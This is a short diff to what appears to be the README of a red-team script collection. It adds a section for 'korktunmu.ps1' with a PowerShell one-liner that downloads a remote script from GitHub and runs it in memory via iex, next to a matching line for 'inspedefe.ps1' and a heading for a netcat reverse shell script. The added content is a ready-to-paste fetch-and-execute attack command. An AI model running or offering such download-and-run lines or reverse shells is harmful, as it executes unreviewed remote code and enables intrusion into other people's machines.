@@ -25,6 +25,12 @@ a string search tool inspired by Didier Stevens's PDFiD
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/inspedefe.ps1') 
 ```
 
+## korktunmu.ps1
+
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/korktunmu.ps1') 
+```
+
 ## godhand.ps1
 Simple reverse shell with netcat without no obfuscation
 ``` powershell
